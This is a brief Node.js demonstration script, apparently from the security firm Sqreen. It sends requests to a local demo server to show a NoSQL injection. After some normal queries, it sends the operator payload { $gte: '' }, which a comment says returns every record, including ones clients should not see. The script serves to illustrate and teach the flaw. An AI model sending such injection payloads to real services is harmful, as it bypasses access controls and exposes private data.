/**
 * Copyright (c) 2016 Sqreen. All Rights Reserved.
 * Please refer to our terms for more information: https://www.sqreen.io/terms.html
 */
'use strict';
const Request = require('request');

const makeRequest = function (type, atk) {

    Request({
        method: 'POST',
        url: 'http://localhost:3000/documents/find',
        json: { type }
    }, (err, result) => {

        console.log(`Got response from server (body: ${JSON.stringify({type})}, attack: ${!!atk}):`);
        console.log(`ID:\t\t\t\tTYPE\tTITLE:`);
        result.body.forEach((item) => {
            console.log(`${item._id}\t${item.type}\t${item.title}\t`);
        });
        console.log('');
    });
};

['blog', 'fairy', 'evil projects'].forEach((type) => makeRequest(type, false));

makeRequest({ $gte: '' }, true);// we display all the content of the collection even 'evil project' that should not been seen by client
